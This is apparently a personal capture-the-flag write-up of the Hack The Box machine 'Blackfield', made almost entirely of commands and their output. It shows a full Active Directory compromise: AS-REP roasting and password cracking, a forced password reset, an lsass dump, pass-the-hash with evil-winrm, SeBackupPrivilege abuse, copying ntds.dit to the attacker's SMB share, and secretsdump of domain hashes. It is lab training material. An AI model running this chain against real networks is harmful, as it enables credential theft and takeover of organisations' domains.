  # Blackfield
## smbclient
## kerbrute
## bloodhound-python
## evil-winrm
## impacket-GetNPUsers
## impacket-smbserver
## impacket-secretsdump
## diskshadow
``````

➜  echo "10.10.10.192 blackfield.htb" | sudo tee -a /etc/hosts

10.10.10.192 blackfield.htb

➜  rustscan -a blackfield.htb --ulimit 5000

Open 10.10.10.192:53
Open 10.10.10.192:88
Open 10.10.10.192:135
Open 10.10.10.192:389
Open 10.10.10.192:445
Open 10.10.10.192:593
Open 10.10.10.192:3268
Open 10.10.10.192:5985

➜  sudo nmap -Pn -sV -T4 -p- -oA ~/htb/Active_Directory_101/Blackfield -vv blackfield.htb

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-02 18:30:23Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

➜  sudo nmap -Pn -A -T4 -p- -vv blackfield.htb   

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-02 18:33:50Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

Host script results:
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2022-07-02T18:34:01
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48702/tcp): CLEAN (Timeout)
|   Check 2 (port 61348/tcp): CLEAN (Timeout)
|   Check 3 (port 55984/udp): CLEAN (Timeout)
|   Check 4 (port 53637/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

➜  sudo nmap -Pn -sU -T4 -p1-500 -vv blackfield.htb

PORT    STATE SERVICE REASON
53/udp  open  domain  udp-response ttl 127
389/udp open  ldap    udp-response ttl 127

➜  smbclient -L //blackfield.htb/

Password for [WORKGROUP\windows_kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	forensic        Disk      Forensic / Audit share.
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	profiles$       Disk      
	SYSVOL          Disk      Logon server share 

Enumerating //blackfield.htb/profiles$ there is a lengthly list of users
One liner below to retrieve the list of users and input into file called 'users.txt'

➜  smbclient -N //blackfield.htb/profiles$ -c ls | awk '{ print $1 }' > users.txt

➜  impacket-GetNPUsers blackfield.local/ -no-pass -usersfile user.txt -dc-ip blackfield.htb | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:610b9f8cc69072164102783714c88fd2$8450bef13afb8d1f75a434a37f9b11e84971160939bdff57ba76a8d12cf6210ab4f2ad45a1c6414b2579c60912a7a2ac225c691c4335a96fbb8f1e412e0d729c06d775f9622d97ddf20b6d4709a8e237d1fea7057463adc1e29c0d1251272d75453057ab36a668553c08dd2adf84968bd4a8788f3b5c8e3480df5fbad4614c991d4c6d79bffdacea8c0e507f7e1aea61fe9d752432a13910642eaac2118a8381466f41486159bd9fdd826fa513d9c5d9cbda9212a528783d49598e85e33df7f346e24dfb91b8d1dd74911e648083fd527a90f0293adb06151a2a36bf0dfc47521cb3d29b04acb9c7c960eba9470c48b49b1db4e5
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax

➜  vi hash.txt
Add:

$krb5asrep$23$support@BLACKFIELD.LOCAL:610b9f8cc69072164102783714c88fd2$8450bef13afb8d1f75a434a37f9b11e84971160939bdff57ba76a8d12cf6210ab4f2ad45a1c6414b2579c60912a7a2ac225c691c4335a96fbb8f1e412e0d729c06d775f9622d97ddf20b6d4709a8e237d1fea7057463adc1e29c0d1251272d75453057ab36a668553c08dd2adf84968bd4a8788f3b5c8e3480df5fbad4614c991d4c6d79bffdacea8c0e507f7e1aea61fe9d752432a13910642eaac2118a8381466f41486159bd9fdd826fa513d9c5d9cbda9212a528783d49598e85e33df7f346e24dfb91b8d1dd74911e648083fd527a90f0293adb06151a2a36bf0dfc47521cb3d29b04acb9c7c960eba9470c48b49b1db4e5

➜  hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt 

$krb5asrep$23$support@BLACKFIELD.LOCAL:610b9f8cc69072164102783714c88fd2$8450bef13afb8d1f75a434a37f9b11e84971160939bdff57ba76a8d12cf6210ab4f2ad45a1c6414b2579c60912a7a2ac225c691c4335a96fbb8f1e412e0d729c06d775f9622d97ddf20b6d4709a8e237d1fea7057463adc1e29c0d1251272d75453057ab36a668553c08dd2adf84968bd4a8788f3b5c8e3480df5fbad4614c991d4c6d79bffdacea8c0e507f7e1aea61fe9d752432a13910642eaac2118a8381466f41486159bd9fdd826fa513d9c5d9cbda9212a528783d49598e85e33df7f346e24dfb91b8d1dd74911e648083fd527a90f0293adb06151a2a36bf0dfc47521cb3d29b04acb9c7c960eba9470c48b49b1db4e5:#00^BlackKnight

Password:

#00^BlackKnight

support:#00^BlackKnight

Alternatively,

➜  dist git:(master) ./kerbrute_linux_amd64 userenum --dc blackfield.htb -d blackfield ~/users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 07/02/22 - Ronnie Flathers @ropnop

2022/07/02 08:09:15 >  Using KDC(s):
2022/07/02 08:09:15 >  	blackfield.htb:88

2022/07/02 08:09:36 >  [+] VALID USERNAME:	 audit2020@blackfield
2022/07/02 08:11:35 >  [+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$support@BLACKFIELD.LOCAL:0b0e04f6864dd7e36675d68ec658e528$08244175ce20360db73df4439ad14955732fb0e6b570d4794caca73c9d7188f49fd26bfb20a2e8058a5314f7452c5f1035ccf2c0e7323d5bdc445ff7907ced0e2ddd3c5d1139d0bf8042cbbc69ab073f7d0ec91685ef7a33c383c2a79fa857c56227487dde75393d4b3039fceb7834e5f2da1154c1f860b6ef3e497a3b4064eaed6ba72a510c40e7159032e0add819e25d90b04e38c4847ffeb29ec7c565ce8761821713856076f4ecdd8ea96e83c199f07ecac1a989f14b69ebf86be299d09efc2d4e0a471bd27627156123732b3690cf03843de1d3566178541fab652842e110af50eee67dc621774f896ea275e908fc7a502e36b514b844a096dc0cac89dc1a79
2022/07/02 08:11:35 >  [+] VALID USERNAME:	 support@blackfield
2022/07/02 08:11:36 >  [+] VALID USERNAME:	 svc_backup@blackfield
2022/07/02 08:12:02 >  Done! Tested 317 usernames (3 valid) in 167.335 second

➜  sudo apt install docker.io -y
➜  sudo service docker start
➜  cd /opt ; sudo git clone https://github.com/fox-it/BloodHound.py ; cd BloodHound.py ; sudo docker build -t bloodhound . ; sudo docker run -v ${PWD}:/bloodhound-data -it bloodhound
➜  -5.1# bloodhound-python -c all -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192

**DISCLAIMER**
Enumerating with bloodhound-python WORKS with the 'sudo apt install bloodhoud' version 4.1.0
vs.
Enumeration with SharpHound.exe via evil-winrm which requires a newer version of bloodhound i.e. vs. 4.3.0

Go to:

/opt/Bloodhound.py

Import *.json files

Type into search:

support

Click: 

SUPPORT@BLACKFIELD.LOCAL

Right-click 'SUPPORT@BLACKFIELD.LOCAL' icon
Select: 

'! Mark User as Owned'

Left-click 'SUPPORT@BLACKFIELD.LOCAL' icon

Go to: 'Node Info' -> 'OUTBOUND CONTROL RIGHTS' -> Left-click 'First Degree Object Control'

Hover over: 'ForceChangePassword' -> Right-click -> Help

Response:

'The user SUPPORT@BLACKFIELD.LOCAL has the capability to change the user AUDIT2020@BLACKFIELD.LOCAL's password without knowing that user's current password.'

➜  net | grep password 

net password        Change user password on target server

➜  net rpc password audit2020 -U support -S blackfield.htb

Enter new password for audit2020: c0rvu5!
Password for [WORKGROUP\support]: #00^BlackKnight

➜  smbclient //blackfield.htb/forensic -U audit2020%c0rvu5! 
smb: \> ls

  .                                   D        0  Sun Feb 23 07:03:16 2020
  ..                                  D        0  Sun Feb 23 07:03:16 2020
  commands_output                     D        0  Sun Feb 23 12:14:37 2020
  memory_analysis                     D        0  Thu May 28 15:28:33 2020
  tools                               D        0  Sun Feb 23 07:39:08 2020

smb: \> cd commands_output\
smb: \> recurse ON
smb: \> mget *
smb: \> recurse OFF
smb: \> ..
smb: \> cd memory_analysis
smb: \memory_analysis\> get lsass.zip

getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (3099.0 KiloBytes/sec) (average 3099.0 KiloBytes/sec)

smb: \> exit

➜  unzip lsass.zip
➜  pip3 install pypykatz
➜  pypykatz lsa minidump lsass.DMP > results.txt
➜  sudo apt install bat
➜  sudo ln -s /usr/bin/batcat ~/.local/bin/bat
➜  bat results.txt 

  12   │         Username: svc_backup
  13   │         Domain: BLACKFIELD
  14   │         LM: NA
  15   │         NT: 9658d1d1dcd9250115e2205d9f48400d
  
 111   │         Username: Administrator
 112   │         Domain: BLACKFIELD
 113   │         LM: NA
 114   │         NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62

➜  evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i blackfield.htb

*Evil-WinRM* PS C:\Users\svc_backup\Documents> get-childitem -path C:\Users -include *.txt* -File -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt
-a----        11/5/2020   8:38 PM             32 root.txt

    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt

t*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt

user_flag

*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\Users\svc_backup\Documents> net user svc_backup

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users

➜  cd /opt ; sudo git clone https://github.com/giuliano108/SeBackupPrivilege.git ; cd /SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug

➜  Debug git:(master) ls

SeBackupPrivilegeCmdLets.dll  SeBackupPrivilegeUtils.dll

➜  Debug git:(master) pwd

/opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> cd C:\programdata
*Evil-WinRM* PS C:\programdata> upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\programdata> upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeUtils.dll

➜  sudo impacket-smbserver share . -smb2support -username hey -password hey

on target

*Evil-WinRM* PS C:\> net use \\10.10.16.2\share /u:hey hey
*Evil-WinRM* PS C:\> cd  \\10.10.16.2\share
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.16.2\share> net use /d \\10.10.16.2\share

➜  ls

domain_admins.txt  domain_users.txt    ipconfig.txt  lsass.zip  netstat.txt  results.txt  support.txt  systeminfo.txt  users.txt
domain_groups.txt  firewall_rules.txt  lsass.DMP     mmc.zip    ntds.dit     route.txt    system       tasklist.txt    vss.dsh

➜  impacket-secretsdump -ntds ntds.dit -system system local

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::

➜  Blackfield evil-winrm -i blackfield.htb -u administrator -H 184fb5e5178480be64824d4cd53b99ee

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\svc_backup\Desktop\user.txt

user_flag

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt

root_flag

``````

##### References
https://github.com/fox-it/BloodHound.py
https://github.com/giuliano108/SeBackupPrivilege

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702091533.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702091726.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702091758.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702091814.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702092026.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702092449.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702101040.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702101112.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702101204.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702113119.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702103103.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702103151.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702103457.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702112426.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702103823.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702112339.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220702111058.png)

#hacking
